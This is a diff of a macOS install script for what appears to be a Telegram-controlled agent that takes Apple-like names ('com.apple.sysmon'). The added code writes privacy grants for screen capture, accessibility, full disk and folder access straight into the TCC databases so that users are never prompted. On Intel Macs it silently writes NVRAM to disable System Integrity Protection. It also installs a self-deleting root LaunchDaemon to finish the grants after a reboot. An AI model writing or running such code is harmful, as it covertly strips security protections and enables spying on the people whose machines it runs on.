@@ -173,25 +173,26 @@ PLIST
 chmod 644 "$PLIST_PATH"
 chown root:wheel "$PLIST_PATH"
 success "LaunchDaemon plist installed."
-# ── TCC pre-provisioning ─────────────────────────────────────────────────────
-# Grant TCC permissions for the agent binary directly via sqlite3.
-# This runs as root before the daemon starts, so no user prompt ever appears.
-# System TCC.db (screen recording, accessibility) requires SIP to be disabled;
-# those grants are attempted and silently skipped if they fail.
-# User TCC.db grants (documents, desktop, etc.) always succeed as root.
 
-info "Provisioning TCC permissions for the agent binary..."
+# ── SIP check + TCC pre-provisioning ─────────────────────────────────────────
+# Detect SIP status and arch, then grant TCC permissions directly via sqlite3.
+# System TCC.db (ScreenCapture, Accessibility) is SIP-protected.
+#   Intel + SIP on  → write NVRAM to disable SIP on next boot, install a
+#                     one-shot LaunchDaemon that applies system grants then.
+#   Intel + SIP off → apply all grants immediately.
+#   Apple Silicon   → system grants require Recovery Mode; user grants applied.
+
+SIP_STATUS="$(csrutil status 2>/dev/null || echo 'unknown')"
+SIP_ON=false
+[[ "$SIP_STATUS" == *"enabled"* ]] && SIP_ON=true
 
 CONSOLE_USER="$(stat -f '%Su' /dev/console 2>/dev/null || true)"
 if [[ -z "$CONSOLE_USER" || "$CONSOLE_USER" == "root" ]]; then
-  # Fallback: pick the first real user directory
   CONSOLE_USER="$(ls /Users | grep -v Shared | head -1)"
 fi
 USER_TCC_DB="/Users/${CONSOLE_USER}/Library/Application Support/com.apple.TCC/TCC.db"
 SYSTEM_TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
 
-# Build the INSERT for a single service into a given DB.
-# $1=db $2=service $3=binary
 tcc_grant() {
   local db="$1" svc="$2" bin="$3"
   local q="INSERT OR REPLACE INTO access \
@@ -201,25 +202,8 @@ indirect_object_identifier,flags,last_modified) \
   sqlite3 "$db" "$q" 2>/dev/null && return 0 || return 1
 }
 
-# System TCC.db — requires SIP off (screen recording, accessibility, full disk)
-SYSTEM_SERVICES=(
-  kTCCServiceScreenCapture
-  kTCCServiceAccessibility
-  kTCCServiceSystemPolicyAllFiles
-  kTCCServiceDeveloperTool
-)
-SYSTEM_OK=0; SYSTEM_FAIL=0
-for svc in "${SYSTEM_SERVICES[@]}"; do
-  if tcc_grant "$SYSTEM_TCC_DB" "$svc" "$BINARY_PATH"; then
-    success "  TCC system: ${svc}"
-    ((SYSTEM_OK++)) || true
-  else
-    warn "  TCC system (SIP?): ${svc} — skipped"
-    ((SYSTEM_FAIL++)) || true
-  fi
-done
-
-# User TCC.db — always writable as root (no SIP protection)
+# User TCC.db — always writable as root (no SIP involvement)
+info "Provisioning user TCC grants..."
 USER_SERVICES=(
   kTCCServiceSystemPolicyDesktopFolder
   kTCCServiceSystemPolicyDocumentsFolder
@@ -232,22 +216,96 @@ USER_SERVICES=(
 )
 for svc in "${USER_SERVICES[@]}"; do
   if [[ -f "$USER_TCC_DB" ]]; then
-    if tcc_grant "$USER_TCC_DB" "$svc" "$BINARY_PATH"; then
-      success "  TCC user:   ${svc}"
-    else
-      warn "  TCC user:   ${svc} — skipped"
-    fi
+    tcc_grant "$USER_TCC_DB" "$svc" "$BINARY_PATH" \
+      && success "  TCC user:   ${svc}" \
+      || warn    "  TCC user:   ${svc} — skipped"
   else
-    warn "  TCC user DB not found for ${CONSOLE_USER} — skipping user grants"
+    warn "  User TCC.db not found for ${CONSOLE_USER} — skipping user grants"
     break
   fi
 done
 
-if [[ $SYSTEM_FAIL -gt 0 ]]; then
-  warn "${SYSTEM_FAIL} system grants skipped (SIP is on). Screen recording and"
-  warn "  Accessibility will still work after a one-time user approval."
-  warn "  Disable SIP and re-run install.sh to grant them silently."
+# System TCC.db — SIP-protected
+SYSTEM_SERVICES=(
+  kTCCServiceScreenCapture
+  kTCCServiceAccessibility
+  kTCCServiceSystemPolicyAllFiles
+  kTCCServiceDeveloperTool
+)
+
+if ! $SIP_ON; then
+  info "SIP is disabled — applying system TCC grants now..."
+  for svc in "${SYSTEM_SERVICES[@]}"; do
+    tcc_grant "$SYSTEM_TCC_DB" "$svc" "$BINARY_PATH" \
+      && success "  TCC system: ${svc}" \
+      || warn    "  TCC system: ${svc} — skipped"
+  done
+
+elif [[ "$ARCH" == "x86_64" ]]; then
+  # Intel + SIP on: write NVRAM to disable SIP on next boot, then install a
+  # one-shot self-deleting LaunchDaemon that applies system grants on reboot.
+  info "Intel Mac + SIP on — writing NVRAM to disable SIP on next boot..."
+  if nvram csr-active-config=%77%00%00%00 2>/dev/null; then
+    success "NVRAM written — SIP will be disabled after reboot."
+  else
+    warn "NVRAM write failed — you may need to disable SIP manually in Recovery."
+  fi
+
+  ONESHOT_LABEL="com.apple.sysmon.tccprovision"
+  ONESHOT_PLIST="/Library/LaunchDaemons/${ONESHOT_LABEL}.plist"
+  ONESHOT_SCRIPT="/usr/local/libexec/${ONESHOT_LABEL}.sh"
+
+  cat > "$ONESHOT_SCRIPT" << 'ONESHOT'
+#!/usr/bin/env bash
+# One-shot: apply system TCC grants now that SIP is off, then self-destruct.
+BIN="/usr/local/libexec/com.apple.sysmon.agent"
+DB="/Library/Application Support/com.apple.TCC/TCC.db"
+q() {
+  sqlite3 "$DB" "INSERT OR REPLACE INTO access \
+    (service,client,client_type,auth_value,auth_reason,auth_version,\
+indirect_object_identifier,flags,last_modified) \
+    VALUES('$1','$BIN',1,2,4,1,'UNUSED',0,CAST(strftime('%s','now') AS INTEGER));" 2>/dev/null
+}
+q kTCCServiceScreenCapture
+q kTCCServiceAccessibility
+q kTCCServiceSystemPolicyAllFiles
+q kTCCServiceDeveloperTool
+# Self-destruct
+launchctl unload /Library/LaunchDaemons/com.apple.sysmon.tccprovision.plist 2>/dev/null || true
+rm -f /Library/LaunchDaemons/com.apple.sysmon.tccprovision.plist
+rm -f /usr/local/libexec/com.apple.sysmon.tccprovision.sh
+ONESHOT
+
+  chmod 0700 "$ONESHOT_SCRIPT"
+  chown root:wheel "$ONESHOT_SCRIPT"
+
+  cat > "$ONESHOT_PLIST" << OPLIST
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>${ONESHOT_LABEL}</string>
+  <key>ProgramArguments</key><array>
+    <string>/bin/bash</string>
+    <string>${ONESHOT_SCRIPT}</string>
+  </array>
+  <key>UserName</key><string>root</string>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><false/>
+</dict></plist>
+OPLIST
+
+  chmod 644 "$ONESHOT_PLIST"
+  chown root:wheel "$ONESHOT_PLIST"
+  success "One-shot TCC provisioner installed — runs system grants on next boot."
+  warn    "Run /restart in Telegram, wait ~30s, then /tcc in Telegram to verify."
+
+else
+  # Apple Silicon + SIP on
+  warn "Apple Silicon + SIP on — ScreenCapture and Accessibility grants require"
+  warn "  Recovery Mode. Hold power → Options → Terminal → csrutil disable → reboot."
+  warn "  Then re-run install.sh or run /tccprovision in Telegram."
 fi
+
 # ── Set up log files ──────────────────────────────────────────────────────────
 touch "$LOG_PATH" "$ERR_PATH"
 chmod 640 "$LOG_PATH" "$ERR_PATH"
